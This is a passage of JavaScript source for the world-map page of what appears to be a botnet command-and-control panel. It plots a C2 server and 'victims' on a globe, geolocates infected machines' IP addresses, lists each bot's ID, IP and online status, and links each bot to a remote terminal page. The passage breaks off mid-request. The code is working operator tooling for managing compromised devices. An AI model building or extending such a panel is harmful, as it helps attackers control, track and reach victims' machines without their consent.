// ============================================================
// 🌍 World Map — Server + Victims
// ============================================================
import { getLayout } from "./layout.js";

export function getWorldPage() {
  const content = `
<div class="page-header" style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;">
  <div>
    <div class="page-title">WORLD MAP</div>
    <div class="page-subtitle">Live device locations + server</div>
  </div>
  <button class="map-btn fullscreen-btn" onclick="toggleFullscreenMap()" title="Fullscreen">
    FULLSCREEN
  </button>
</div>

<div style="display:grid;grid-template-columns:3fr 1fr;gap:20px;" class="world-layout" id="worldLayout">
  <div class="card" style="padding:0;overflow:hidden;position:relative;min-height:600px;" id="globeCard">
    <div id="globeViz" style="width:100%;height:600px;background:#000;"></div>
    
    <div style="position:absolute;top:16px;left:16px;display:flex;gap:8px;z-index:10;">
      <button class="map-btn" onclick="toggleAutoRotate()" id="autoRotateBtn">AUTO-ROTATE</button>
      <button class="map-btn" onclick="resetView()">RESET</button>
    </div>

    <div style="position:absolute;bottom:16px;left:16px;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);border:1px solid var(--border-hi);border-radius:8px;padding:12px 16px;z-index:10;">
      <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);letter-spacing:2px;margin-bottom:8px;">LEGEND</div>
      <div style="display:flex;flex-direction:column;gap:6px;font-family:var(--font-mono);font-size:11px;">
        <div style="display:flex;align-items:center;gap:8px;">
          <span style="width:12px;height:12px;border-radius:50%;background:#0066ff;box-shadow:0 0 10px #0066ff;"></span>
          <span style="color:var(--text-dim);">C2 Server</span>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <span style="width:10px;height:10px;border-radius:50%;background:#ff0040;box-shadow:0 0 8px #ff0040;"></span>
          <span style="color:var(--text-dim);">Victim (Offline)</span>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <span style="width:10px;height:10px;border-radius:50%;background:#00ff88;box-shadow:0 0 8px #00ff88;"></span>
          <span style="color:var(--text-dim);">Victim (Online)</span>
        </div>
      </div>
    </div>

    <div style="position:absolute;top:16px;right:16px;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);border:1px solid var(--border-hi);border-radius:8px;padding:12px 16px;z-index:10;">
      <div style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);letter-spacing:2px;margin-bottom:8px;">STATS</div>
      <div style="font-family:var(--font-mono);font-size:12px;color:var(--text);">
        <div>Countries: <span id="statCountries" style="color:var(--accent-blue);font-weight:700;">0</span></div>
        <div>Cities: <span id="statCities" style="color:var(--accent-cyan);font-weight:700;">0</span></div>
        <div>Bots: <span id="statTotalBots" style="color:var(--accent-red);font-weight:700;">0</span></div>
        <div>Online: <span id="statOnline" style="color:var(--green);font-weight:700;">0</span></div>
      </div>
    </div>

    <div style="position:absolute;bottom:16px;right:16px;background:rgba(0,102,255,0.15);backdrop-filter:blur(10px);border:1px solid #0066ff;border-radius:8px;padding:10px 14px;z-index:10;">
      <div style="font-family:var(--font-mono);font-size:9px;color:#6699ff;letter-spacing:2px;margin-bottom:4px;">C2 SERVER</div>
      <div style="font-family:var(--font-mono);font-size:11px;color:#fff;font-weight:700;">Algiers, Algeria</div>
      <div style="font-family:var(--font-mono);font-size:9px;color:#6699ff;margin-top:2px;">36.74°N, 3.11°E</div>
    </div>
  </div>

  <div class="card" style="max-height:600px;overflow-y:auto;" id="countriesCard">
    <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;color:var(--text);letter-spacing:1px;margin-bottom:16px;position:sticky;top:0;background:var(--bg-1);padding-bottom:12px;border-bottom:1px solid var(--border);">
      COUNTRIES
    </div>
    <div id="countriesList" style="display:flex;flex-direction:column;gap:8px;">
      <div class="loading">Loading...</div>
    </div>
  </div>
</div>

<style>
.map-btn {
  padding: 8px 14px;
  background: rgba(0, 0, 0, 0.85);
  backdrop-filter: blur(10px);
  border: 1px solid var(--accent-blue);
  color: var(--accent-blue);
  border-radius: 6px;
  font-family: var(--font-mono);
  font-size: 11px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  letter-spacing: 1px;
}
.map-btn:hover {
  background: var(--accent-blue);
  color: #fff;
  box-shadow: 0 0 20px rgba(0, 102, 255, 0.5);
}
.fullscreen-btn {
  padding: 10px 20px;
  background: linear-gradient(135deg, var(--accent-red), var(--accent-blue));
  color: #fff;
  border: none;
  font-size: 12px;
  letter-spacing: 2px;
}
.fullscreen-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 30px rgba(255, 0, 64, 0.5);
}
.country-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px;
  background: var(--bg-2);
  border: 1px solid var(--border);
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s;
  font-family: var(--font-mono);
}
.country-item:hover {
  border-color: var(--accent-blue);
  background: var(--bg-3);
  transform: translateX(4px);
}
.country-info {
  display: flex;
  align-items: center;
  gap: 10px;
  min-width: 0;
  flex: 1;
}
.country-flag {
  font-size: 20px;
  flex-shrink: 0;
}
.country-details {
  min-width: 0;
  flex: 1;
  display: flex;
  flex-direction: column;
}
.country-name {
  font-size: 12px;
  color: var(--text);
  font-weight: 600;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.country-cities {
  font-size: 10px;
  color: var(--text-mute);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  margin-top: 2px;
}
.country-count {
  font-size: 14px;
  font-weight: 700;
  color: var(--accent-blue);
  background: rgba(0, 102, 255, 0.15);
  padding: 4px 10px;
  border-radius: 12px;
  min-width: 36px;
  text-align: center;
}
.country-count.online {
  color: var(--green);
  background: rgba(0, 255, 136, 0.15);
}
.country-popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: rgba(0, 0, 0, 0.98);
  border: 2px solid var(--accent-blue);
  border-radius: 12px;
  padding: 24px;
  z-index: 1000;
  min-width: 320px;
  max-width: 90vw;
  max-height: 80vh;
  overflow-y: auto;
  box-shadow: 0 0 60px rgba(0, 102, 255, 0.5);
  display: none;
}
.country-popup.show { display: block; }
.popup-backdrop {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0, 0, 0, 0.8);
  backdrop-filter: blur(5px);
  z-index: 999;
  display: none;
}
.popup-backdrop.show { display: block; }
.popup-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
  padding-bottom: 12px;
  border-bottom: 1px solid var(--border);
}
.popup-title {
  font-family: var(--font-mono);
  font-size: 16px;
  font-weight: 700;
  color: var(--accent-red);
  letter-spacing: 1px;
}
.popup-close {
  background: none;
  border: 1px solid var(--accent-red);
  color: var(--accent-red);
  width: 32px;
  height: 32px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 16px;
}
.popup-bot-item {
  padding: 10px;
  background: var(--bg-2);
  border-left: 3px solid var(--accent-blue);
  border-radius: 6px;
  margin-bottom: 8px;
  font-family: var(--font-mono);
  font-size: 11px;
  cursor: pointer;
  transition: all 0.2s;
}
.popup-bot-item:hover {
  background: var(--bg-3);
  transform: translateX(4px);
}
.popup-bot-item.online { border-left-color: var(--green); }
.popup-bot-item.offline { border-left-color: var(--accent-red); }

.world-layout.fullscreen {
  position: fixed !important;
  top: 0; left: 0; right: 0; bottom: 0;
  z-index: 9999;
  background: #000;
  padding: 0;
  gap: 0;
  grid-template-columns: 1fr !important;
}
.world-layout.fullscreen #globeCard {
  min-height: 100vh;
  border-radius: 0;
  border: none;
}
.world-layout.fullscreen #globeViz {
  height: 100vh !important;
}
.world-layout.fullscreen #countriesCard {
  display: none;
}

@media (max-width: 900px) {
  .world-layout { grid-template-columns: 1fr !important; }
  #globeViz { height: 400px !important; }
  .country-popup { min-width: 90vw; padding: 16px; }
}
</style>

<div class="popup-backdrop" id="popupBackdrop" onclick="closePopup()"></div>
<div class="country-popup" id="countryPopup">
  <div class="popup-header">
    <div class="popup-title" id="popupTitle">Country</div>
    <button class="popup-close" onclick="closePopup()">X</button>
  </div>
  <div id="popupBots"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/globe.gl@2.32.0/dist/globe.gl.min.js"></script>
<script>
var globe = null;
var allBots = [];
var countriesCache = {};
var autoRotate = true;
var botStates = {};
var ipInfoCache = {};

// ════════════════════════════════════════════════════════════
// 🔵 C2 SERVER LOCATION
// ════════════════════════════════════════════════════════════
var SERVER_LOCATION = {
  lat: 36.7405,
  lng: 3.1159,
  city: "Algiers",
  country: "Algeria",
  flag: "\\u{1F1E9}\\u{1F1FF}",
};

var countryNames = {
  DZ:"Algeria",MA:"Morocco",TN:"Tunisia",EG:"Egypt",LY:"Libya",SA:"Saudi Arabia",
  AE:"UAE",QA:"Qatar",KW:"Kuwait",BH:"Bahrain",OM:"Oman",JO:"Jordan",LB:"Lebanon",
  SY:"Syria",IQ:"Iraq",YE:"Yemen",PS:"Palestine",IL:"Israel",TR:"Turkey",IR:"Iran",
  US:"United States",CA:"Canada",MX:"Mexico",BR:"Brazil",AR:"Argentina",
  GB:"United Kingdom",FR:"France",DE:"Germany",IT:"Italy",ES:"Spain",PT:"Portugal",
  NL:"Netherlands",BE:"Belgium",CH:"Switzerland",AT:"Austria",SE:"Sweden",NO:"Norway",
  DK:"Denmark",FI:"Finland",PL:"Poland",CZ:"Czechia",SK:"Slovakia",HU:"Hungary",
  RO:"Romania",BG:"Bulgaria",GR:"Greece",RU:"Russia",UA:"Ukraine",BY:"Belarus",
  KZ:"Kazakhstan",CN:"China",JP:"Japan",KR:"South Korea",IN:"India",PK:"Pakistan",
  ID:"Indonesia",MY:"Malaysia",TH:"Thailand",VN:"Vietnam",PH:"Philippines",
  SG:"Singapore",AU:"Australia",NZ:"New Zealand",ZA:"South Africa",NG:"Nigeria",
  KE:"Kenya",GH:"Ghana",ET:"Ethiopia",SD:"Sudan",
};

var countryFlags = {
  DZ:"\\u{1F1E9}\\u{1F1FF}",MA:"\\u{1F1F2}\\u{1F1E6}",TN:"\\u{1F1F9}\\u{1F1F3}",EG:"\\u{1F1EA}\\u{1F1EC}",LY:"\\u{1F1F1}\\u{1F1FE}",
  SA:"\\u{1F1F8}\\u{1F1E6}",AE:"\\u{1F1E6}\\u{1F1EA}",QA:"\\u{1F1F6}\\u{1F1E6}",KW:"\\u{1F1F0}\\u{1F1FC}",BH:"\\u{1F1E7}\\u{1F1ED}",
  OM:"\\u{1F1F4}\\u{1F1F2}",JO:"\\u{1F1EF}\\u{1F1F4}",LB:"\\u{1F1F1}\\u{1F1E7}",SY:"\\u{1F1F8}\\u{1F1FE}",IQ:"\\u{1F1EE}\\u{1F1F6}",
  YE:"\\u{1F1FE}\\u{1F1EA}",PS:"\\u{1F1F5}\\u{1F1F8}",IL:"\\u{1F1EE}\\u{1F1F1}",TR:"\\u{1F1F9}\\u{1F1F7}",IR:"\\u{1F1EE}\\u{1F1F7}",
  US:"\\u{1F1FA}\\u{1F1F8}",CA:"\\u{1F1E8}\\u{1F1E6}",MX:"\\u{1F1F2}\\u{1F1FD}",BR:"\\u{1F1E7}\\u{1F1F7}",AR:"\\u{1F1E6}\\u{1F1F7}",
  GB:"\\u{1F1EC}\\u{1F1E7}",FR:"\\u{1F1EB}\\u{1F1F7}",DE:"\\u{1F1E9}\\u{1F1EA}",IT:"\\u{1F1EE}\\u{1F1F9}",ES:"\\u{1F1EA}\\u{1F1F8}",
  PT:"\\u{1F1F5}\\u{1F1F9}",NL:"\\u{1F1F3}\\u{1F1F1}",BE:"\\u{1F1E7}\\u{1F1EA}",CH:"\\u{1F1E8}\\u{1F1ED}",AT:"\\u{1F1E6}\\u{1F1F9}",
  SE:"\\u{1F1F8}\\u{1F1EA}",NO:"\\u{1F1F3}\\u{1F1F4}",DK:"\\u{1F1E9}\\u{1F1F0}",FI:"\\u{1F1EB}\\u{1F1EE}",PL:"\\u{1F1F5}\\u{1F1F1}",
  CZ:"\\u{1F1E8}\\u{1F1FF}",SK:"\\u{1F1F8}\\u{1F1F0}",HU:"\\u{1F1ED}\\u{1F1FA}",RO:"\\u{1F1F7}\\u{1F1F4}",BG:"\\u{1F1E7}\\u{1F1EC}",
  GR:"\\u{1F1EC}\\u{1F1F7}",RU:"\\u{1F1F7}\\u{1F1FA}",UA:"\\u{1F1FA}\\u{1F1E6}",BY:"\\u{1F1E7}\\u{1F1FE}",KZ:"\\u{1F1F0}\\u{1F1FF}",
  CN:"\\u{1F1E8}\\u{1F1F3}",JP:"\\u{1F1EF}\\u{1F1F5}",KR:"\\u{1F1F0}\\u{1F1F7}",IN:"\\u{1F1EE}\\u{1F1F3}",PK:"\\u{1F1F5}\\u{1F1F0}",
  ID:"\\u{1F1EE}\\u{1F1E9}",MY:"\\u{1F1F2}\\u{1F1FE}",TH:"\\u{1F1F9}\\u{1F1ED}",VN:"\\u{1F1FB}\\u{1F1F3}",PH:"\\u{1F1F5}\\u{1F1ED}",
  SG:"\\u{1F1F8}\\u{1F1EC}",AU:"\\u{1F1E6}\\u{1F1FA}",NZ:"\\u{1F1F3}\\u{1F1FF}",ZA:"\\u{1F1FF}\\u{1F1E6}",NG:"\\u{1F1F3}\\u{1F1EC}",
  KE:"\\u{1F1F0}\\u{1F1EA}",GH:"\\u{1F1EC}\\u{1F1ED}",ET:"\\u{1F1EA}\\u{1F1F9}",SD:"\\u{1F1F8}\\u{1F1E9}",
};

var countryCoords = {
  DZ:[28.0339,1.6596],MA:[31.7917,-7.0926],TN:[33.8869,9.5375],EG:[26.8206,30.8025],
  LY:[26.3351,17.2283],SA:[23.8859,45.0792],AE:[23.4241,53.8478],QA:[25.3548,51.1839],
  KW:[29.3117,47.4818],BH:[25.9304,50.6378],OM:[21.4735,55.9754],JO:[30.5852,36.2384],
  LB:[33.8547,35.8623],SY:[34.8021,38.9968],IQ:[33.2232,43.6793],YE:[15.5527,48.5164],
  PS:[31.9474,35.2272],IL:[31.0461,34.8516],TR:[38.9637,35.2433],IR:[32.4279,53.6880],
  US:[37.0902,-95.7129],CA:[56.1304,-106.3468],MX:[23.6345,-102.5528],BR:[-14.2350,-51.9253],
  AR:[-38.4161,-63.6167],GB:[55.3781,-3.4360],FR:[46.2276,2.2137],DE:[51.1657,10.4515],
  IT:[41.8719,12.5674],ES:[40.4637,-3.7492],PT:[39.3999,-8.2245],NL:[52.1326,5.2913],
  BE:[50.5039,4.4699],CH:[46.8182,8.2275],AT:[47.5162,14.5501],SE:[60.1282,18.6435],
  NO:[60.4720,8.4689],DK:[56.2639,9.5018],FI:[61.9241,25.7482],PL:[51.9194,19.1451],
  CZ:[49.8175,15.4730],SK:[48.6690,19.6990],HU:[47.1625,19.5033],RO:[45.9432,24.9668],
  BG:[42.7339,25.4858],GR:[39.0742,21.8243],RU:[61.5240,105.3188],UA:[48.3794,31.1656],
  BY:[53.7098,27.9534],KZ:[48.0196,66.9237],CN:[35.8617,104.1954],JP:[36.2048,138.2529],
  KR:[35.9078,127.7669],IN:[20.5937,78.9629],PK:[30.3753,69.3451],ID:[-0.7893,113.9213],
  MY:[4.2105,101.9758],TH:[15.8700,100.9925],VN:[14.0583,108.2772],PH:[12.8797,121.7740],
  SG:[1.3521,103.8198],AU:[-25.2744,133.7751],NZ:[-40.9006,174.8860],ZA:[-30.5595,22.9375],
  NG:[9.0820,8.6753],KE:[-0.0236,37.9062],GH:[7.9465,-1.0232],ET:[9.1450,40.4897],
  SD:[12.8628,30.2176],
};

function initGlobe() {
  globe = Globe()
    .globeImageUrl('https://cdn.jsdelivr.net/npm/three-globe/example/img/earth-night.jpg')
    .bumpImageUrl('https://cdn.jsdelivr.net/npm/three-globe/example/img/earth-topology.png')
    .backgroundImageUrl('https://cdn.jsdelivr.net/npm/three-globe/example/img/night-sky.png')
    .backgroundColor('#000000')
    .atmosphereColor('#0066ff')
    .atmosphereAltitude(0.2)
    // ═══ Points ═══
    .pointAltitude(function(d) { return d.isServer ? 0.08 : 0.02; })
    .pointRadius(function(d) { return d.isServer ? 0.8 : d.size; })
    .pointColor(function(d) { return d.color; })
    .pointsMerge(false)
    .pointLabel(function(d) {
      var html = '<div style="background:rgba(0,0,0,0.98);border:2px solid ' + d.color + ';border-radius:10px;padding:12px 16px;font-family:JetBrains Mono,monospace;font-size:11px;color:#fff;min-width:200px;box-shadow:0 0 30px ' + d.color + '60;">';
      if (d.isServer) {
        html += '<div style="color:#0066ff;font-weight:700;font-size:14px;margin-bottom:8px;letter-spacing:1px;">🖥️ C2 SERVER</div>';
        html += '<div style="color:#6699ff;font-size:11px;margin-bottom:6px;">📍 ' + d.city + ', ' + d.country + '</div>';
        html += '<div style="color:#666;font-size:9px;">' + d.lat.toFixed(4) + ', ' + d.lng.toFixed(4) + '</div>';
      } else {
        html += '<div style="color:' + d.color + ';font-weight:700;font-size:13px;margin-bottom:6px;">' + d.flag + ' ' + d.country + '</div>';
        if (d.city) {
          html += '<div style="color:#00ccff;font-size:11px;margin-bottom:8px;">📍 ' + d.city + (d.region ? ', ' + d.region : '') + '</div>';
        }
        html += '<div style="color:#8888aa;">Devices: <span style="color:#fff;font-weight:700;">' + d.count + '</span></div>';
        html += '<div style="color:#8888aa;">Online: <span style="color:#00ff88;font-weight:700;">' + d.onlineCount + '</span></div>';
        html += '<div style="color:#666;font-size:9px;margin-top:6px;">' + d.lat.toFixed(2) + ', ' + d.lng.toFixed(2) + '</div>';
      }
      html += '</div>';
      return html;
    })
    .onPointClick(function(d) { 
      if (d.isServer) {
        showServerInfo();
      } else {
        showCountryPopup(d.countryCode); 
      }
    })
    // ═══ Rings (للبوتات الجديدة) ═══
    .ringsData([])
    .ringColor(function() { return function(t) { return 'rgba(255, 170, 0, ' + (1 - t) + ')'; }; })
    .ringMaxRadius('maxR')
    .ringPropagationSpeed('propagationSpeed')
    .ringRepeatPeriod('repeatPeriod')
    // ═══ Arcs ═══
    .arcsData([])
    .arcColor('color')
    .arcDashLength(0.4)
    .arcDashGap(0.2)
    .arcDashAnimateTime(3000)
    .arcStroke(0.3)
    (document.getElementById('globeViz'));

  globe.width(document.getElementById('globeViz').clientWidth);
  globe.height(600);

  globe.controls().autoRotate = true;
  globe.controls().autoRotateSpeed = 0.5;
  globe.controls().enableDamping = true;
  globe.controls().dampingFactor = 0.1;

  globe.pointOfView({ lat: 28, lng: 10, altitude: 2.5 }, 0);

  updateAutoRotateBtn();
}

function getLocationInfo(ip, botCountry) {
  if (ip && ipInfoCache[ip]) return ipInfoCache[ip];
  
  if (botCountry && botCountry !== 'unknown' && botCountry.length === 2) {
    var cc = botCountry.toUpperCase();
    if (countryCoords[cc]) {
      return {
        countryCode: cc,
        lat: countryCoords[cc][0],
        lon: countryCoords[cc][1],
        city: null,
        region: null,
        precise: false,
      };
    }
  }
  return null;
}

function updateGlobePoints(bots) {
  if (!globe) return;
  
  var cityGroups = {};
  var countryGroups = {};
  
  for (var i = 0; i < bots.length; i++) {
    var b = bots[i];
    var info = getLocationInfo(b.ip, b.country);
    if (!info) continue;
    
    var cc = info.countryCode;
    
    if (info.precise && info.city) {
      var cityKey = (info.city || 'unknown') + '_' + cc;
      if (!cityGroups[cityKey]) {
        cityGroups[cityKey] = {
          cityKey: cityKey,
          countryCode: cc,
          country: countryNames[cc] || cc,
          flag: countryFlags[cc] || "🌍",
          city: info.city,
          region: info.region,
          lat: info.lat,
          lng: info.lon,
          bots: [],
          onlineCount: 0,
        };
      }
      cityGroups[cityKey].bots.push(b);
      if (b.isOnline) cityGroups[cityKey].onlineCount++;
    } else {
      if (!countryGroups[cc]) {
        countryGroups[cc] = {
          countryCode: cc,
          country: countryNames[cc] || cc,
          flag: countryFlags[cc] || "🌍",
          lat: info.lat,
          lng: info.lon,
          bots: [],
          onlineCount: 0,
        };
      }
      countryGroups[cc].bots.push(b);
      if (b.isOnline) countryGroups[cc].onlineCount++;
    }
  }
  
  countriesCache = {};
  Object.assign(countriesCache, countryGroups);
  Object.assign(countriesCache, cityGroups);
  
  // ═══════════════════════════════════════════════════════════
  // ✅ Points: Server + Victims
  // ═══════════════════════════════════════════════════════════
  var points = [];
  
  // 🔵 Server Point
  points.push({
    lat: SERVER_LOCATION.lat,
    lng: SERVER_LOCATION.lng,
    country: SERVER_LOCATION.country,
    countryCode: "SERVER",
    flag: SERVER_LOCATION.flag,
    city: SERVER_LOCATION.city,
    count: 1,
    onlineCount: 1,
    color: '#0066ff',
    size: 0.8,
    isServer: true,
  });
  
  // 🔴/🟢 Victims
  for (var key in countriesCache) {
    var c = countriesCache[key];
    if (!c.lat || !c.lng) continue;
    
    // ✅ اللون حسب الحالة: Online → أخضر، Offline → أحمر
    // إذا كلهم offline → أحمر، إذا فيهم online → أخضر
    var color;
    if (c.onlineCount > 0) {
      color = '#00ff88';  // أخضر (فيه online)
    } else {
      color = '#ff0040';  // أحمر (كله offline)
    }
    
    points.push({
      lat: c.lat,
      lng: c.lng,
      country: c.country,
      countryCode: c.countryCode,
      flag: c.flag,
      count: c.bots.length,
      onlineCount: c.onlineCount,
      color: color,
      size: 0.5 + (c.bots.length * 0.25),
      city: c.city || null,
      region: c.region || null,
      isServer: false,
    });
  }

  globe.pointsData(points);

  // ═══════════════════════════════════════════════════════════
  // ✅ Arcs: من كل victim للسيرفر
  // ═══════════════════════════════════════════════════════════
  var arcsData = [];
  for (var i = 0; i < points.length; i++) {
    var p = points[i];
    if (p.isServer) continue;
    
    arcsData.push({
      startLat: p.lat,
      startLng: p.lng,
      endLat: SERVER_LOCATION.lat,
      endLng: SERVER_LOCATION.lng,
      color: [p.color, '#0066ff'],
    });
  }
  globe.arcsData(arcsData);

  // Stats
  var seenCountries = {};
  var seenCities = {};
  for (var key in countriesCache) {
    var c = countriesCache[key];
    seenCountries[c.countryCode] = true;
    if (c.city) seenCities[(c.city || '') + '_' + c.countryCode] = true;
  }
  
  document.getElementById('statCountries').textContent = Object.keys(seenCountries).length;
  document.getElementById('statCities').textContent = Object.keys(seenCities).length;
  document.getElementById('statTotalBots').textContent = bots.length;
  document.getElementById('statOnline').textContent = bots.filter(function(b){return b.isOnline;}).length;

  updateCountriesList();
}

function updateCountriesList() {
  var container = document.getElementById('countriesList');
  
  var byCountry = {};
  for (var key in countriesCache) {
    var c = countriesCache[key];
    var cc = c.countryCode;
    if (!byCountry[cc]) {
      byCountry[cc] = {
        countryCode: cc,
        country: c.country,
        flag: c.flag,
        cities: {},
        bots: [],
        onlineCount: 0,
      };
    }
    byCountry[cc].bots = byCountry[cc].bots.concat(c.bots);
    byCountry[cc].onlineCount += c.onlineCount;
    if (c.city) {
      byCountry[cc].cities[c.city] = (byCountry[cc].cities[c.city] || 0) + c.bots.length;
    }
  }
  
  var entries = Object.values(byCountry).sort(function(a, b) { 
    if (a.onlineCount !== b.onlineCount) return b.onlineCount - a.onlineCount;
    return b.bots.length - a.bots.length; 
  });
  
  if (entries.length === 0) {
    container.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:20px;">No countries detected</div>';
    return;
  }
  
  container.innerHTML = entries.map(function(c) {
    var citiesStr = Object.keys(c.cities).slice(0, 3).join(', ');
    if (Object.keys(c.cities).length > 3) citiesStr += ' +' + (Object.keys(c.cities).length - 3);
    
    return '<div class="country-item" onclick="showCountryPopup(\\'' + c.countryCode + '\\')">' +
      '<div class="country-info">' +
        '<span class="country-flag">' + c.flag + '</span>' +
        '<div class="country-details">' +
          '<span class="country-name">' + escapeHtml(c.country) + '</span>' +
          (citiesStr ? '<span class="country-cities">📍 ' + escapeHtml(citiesStr) + '</span>' : '') +
        '</div>' +
      '</div>' +
      '<span class="country-count ' + (c.onlineCount > 0 ? 'online' : '') + '">' + c.onlineCount + '/' + c.bots.length + '</span>' +
    '</div>';
  }).join('');
}

function showServerInfo() {
  document.getElementById('popupTitle').textContent = '🖥️ C2 Server';
  var html = '<div style="padding:16px;background:linear-gradient(135deg,rgba(0,102,255,0.15),rgba(0,102,255,0.05));border:1px solid #0066ff;border-radius:10px;font-family:var(--font-mono);">' +
    '<div style="color:#6699ff;font-size:11px;letter-spacing:2px;margin-bottom:12px;">SERVER LOCATION</div>' +
    '<div style="color:#fff;font-size:14px;font-weight:700;margin-bottom:8px;">📍 ' + SERVER_LOCATION.city + ', ' + SERVER_LOCATION.country + ' ' + SERVER_LOCATION.flag + '</div>' +
    '<div style="color:#6699ff;font-size:11px;margin-bottom:12px;">Coordinates: ' + SERVER_LOCATION.lat.toFixed(4) + '°N, ' + SERVER_LOCATION.lng.toFixed(4) + '°E</div>' +
    '<div style="color:#8888aa;font-size:11px;padding-top:12px;border-top:1px solid #1a3a5a;">' +
      '<div>Active Bots: <span style="color:#00ff88;font-weight:700;">' + allBots.filter(function(b){return b.isOnline;}).length + '</span></div>' +
      '<div>Total Bots: <span style="color:#ff0040;font-weight:700;">' + allBots.length + '</span></div>' +
    '</div>' +
  '</div>';
  document.getElementById('popupBots').innerHTML = html;
  document.getElementById('popupBackdrop').classList.add('show');
  document.getElementById('countryPopup').classList.add('show');
}

function showCountryPopup(cc) {
  var allCountryBots = [];
  for (var key in countriesCache) {
    var c = countriesCache[key];
    if (c.countryCode === cc) {
      for (var i = 0; i < c.bots.length; i++) {
        var b = c.bots[i];
        b._city = c.city;
        b._region = c.region;
        allCountryBots.push(b);
      }
    }
  }
  
  if (allCountryBots.length === 0) return;
  
  var countryName = countryNames[cc] || cc;
  var flag = countryFlags[cc] || "🌍";
  
  document.getElementById('popupTitle').textContent = flag + ' ' + countryName;
  
  var html = '';
  for (var i = 0; i < allCountryBots.length; i++) {
    var b = allCountryBots[i];
    html += '<div class="popup-bot-item ' + (b.isOnline ? 'online' : 'offline') + '" onclick="goToBot(\\'' + escapeHtml(b.id).replace(/'/g, "\\\\'") + '\\')">' +
      '<div style="color:var(--accent-red);font-weight:700;margin-bottom:4px;">' + escapeHtml(b.id) + '</div>' +
      (b._city ? '<div style="color:#00ccff;font-size:10px;margin-bottom:2px;">📍 ' + escapeHtml(b._city) + '</div>' : '') +
      '<div style="color:var(--text-dim);font-size:10px;">IP: ' + escapeHtml(b.ip) + '</div>' +
      '<div style="color:' + (b.isOnline ? 'var(--green)' : 'var(--accent-red)') + ';font-size:10px;margin-top:2px;">' + (b.isOnline ? 'ONLINE' : 'OFFLINE') + '</div>' +
    '</div>';
  }
  
  document.getElementById('popupBots').innerHTML = html;
  document.getElementById('popupBackdrop').classList.add('show');
  document.getElementById('countryPopup').classList.add('show');
}

function closePopup() {
  document.getElementById('popupBackdrop').classList.remove('show');
  document.getElementById('countryPopup').classList.remove('show');
}

function goToBot(botId) {
  window.location.href = '/terminal/' + encodeURIComponent(botId);
}

function resetView() {
  globe.pointOfView({ lat: 28, lng: 10, altitude: 2.5 }, 800);
}

function toggleAutoRotate() {
  autoRotate = !autoRotate;
  globe.controls().autoRotate = autoRotate;
  updateAutoRotateBtn();
}

function updateAutoRotateBtn() {
  var btn = document.getElementById('autoRotateBtn');
  if (autoRotate) {
    btn.textContent = 'AUTO-ROTATE ON';
    btn.style.color = 'var(--green)';
    btn.style.borderColor = 'var(--green)';
  } else {
    btn.textContent = 'AUTO-ROTATE OFF';
    btn.style.color = 'var(--accent-blue)';
    btn.style.borderColor = 'var(--accent-blue)';
  }
}

function toggleFullscreenMap() {
  var layout = document.getElementById('worldLayout');
  var isFullscreen = layout.classList.contains('fullscreen');
  
  if (isFullscreen) {
    layout.classList.remove('fullscreen');
    setTimeout(function() {
      if (globe) {
        var w = document.getElementById('globeViz').clientWidth;
        var h = document.getElementById('globeViz').clientHeight;
        globe.width(w);
        globe.height(h);
      }
    }, 150);
  } else {
    layout.classList.add('fullscreen');
    setTimeout(function() {
      if (globe) {
        var w = window.innerWidth;
        var h = window.innerHeight;
        globe.width(w);
        globe.height(h);
        globe.pointOfView({ lat: 28, lng: 10, altitude: 2.5 }, 800);
      }
    }, 150);
  }
}

document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    var layout = document.getElementById('worldLayout');
    if (layout.classList.contains('fullscreen')) toggleFullscreenMap();
  }
});

function checkNewBots(bots) {
  var newBots = [];
  for (var i = 0; i < bots.length; i++) {
    var b = bots[i];
    if (!botStates[b.id]) {
      botStates[b.id] = { isOnline: b.isOnline, added: Date.now() };
      if (Object.keys(botStates).length > 1) newBots.push(b);
    } else {
      botStates[b.id].isOnline = b.isOnline;
    }
  }
  return newBots;
}

function animateNewBot(bot) {
  var info = getLocationInfo(bot.ip, bot.country);
  if (!info) return;
  
  globe.ringsData([{
    lat: info.lat,
    lng: info.lon,
    maxR: 8,
    propagationSpeed: 4,
    repeatPeriod: 500
  }]);
  
  setTimeout(function() { globe.ringsData([]); }, 4000);
  
  globe.pointOfView({ lat: info.lat, lng: info.lon, altitude: 1.8 }, 1500);
  
  setTimeout(function() {
    globe.pointOfView({ lat: 28, lng: 10, altitude: 2.5 }, 1500);
  }, 4000);
}

async function loadBots() {
  try {
    var res = await fetch('/api/all_bots');
    if (res.status === 401) { window.location.href = '/'; return; }
    var bots = await res.json();
    allBots = bots;
    
    var newBots = checkNewBots(bots);
    
    var uniqueIps = [];
    for (var i = 0; i < bots.length; i++) {
      var ip = bots[i].ip;
      if (ip && ip !== 'unknown' && !ipInfoCache[ip]) {
        if (uniqueIps.indexOf(ip) === -1) uniqueIps.push(ip);
      }
    }
    
    if (uniqueIps.length > 0) {
      await fetchLocationForIps(uniqueIps);
    }
    
    updateGlobePoints(bots);
    
    if (newBots.length > 0 && globe) {
      newBots.forEach(function(b, idx) {
        setTimeout(function() { animateNewBot(b); }, idx * 1000);
      });
    }
  } catch (e) { console.error(e); }
}

async function fetchLocationForIps(ips) {
  var batch = ips.slice(0, 100);
  if (batch.length === 0) return;
  
  try {
    var res = await fetch('http://ip-api.com/batch?fields=query,countryCode,lat,lon,city,regionName,status', {
